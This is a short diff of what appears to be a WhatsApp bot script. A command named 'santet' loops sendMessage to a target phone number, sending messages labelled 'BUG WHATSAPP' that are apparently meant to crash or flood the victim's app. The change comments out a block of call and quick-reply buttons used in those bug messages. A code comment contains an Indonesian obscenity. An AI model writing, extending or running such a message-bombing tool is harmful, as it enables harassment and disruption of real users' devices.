@@ -396,7 +396,7 @@ case 'santet':
         jumlah = '3'
         waktu = `2s`
     // KALO MAU BUTTON BANYAK COPY BUTTON NYA TRUS BANYAKIN CONTOH DI BAWAH INI NGENTOT
- templateButtons: [
+ /*templateButtons: [
 { callButton: { displayText: `MAKAN NIH BUG WHATSAPP 😘
 `, phoneNumber: ``}},
 { callButton: { displayText: `MAKAN NIH BUG WHATSAPP 😘
@@ -427,7 +427,7 @@ case 'santet':
 `, id: ``}},
 { quickReplyButton: { displayText: `MAKAN NIH BUG WHATSAPP 😘
 `, id: ``}},
-,
+,*/
 for (let i = 0; i < jumlah; i++) {
 diablo.sendMessage(num, {
 text: 'BUG BY JOSHHH', 
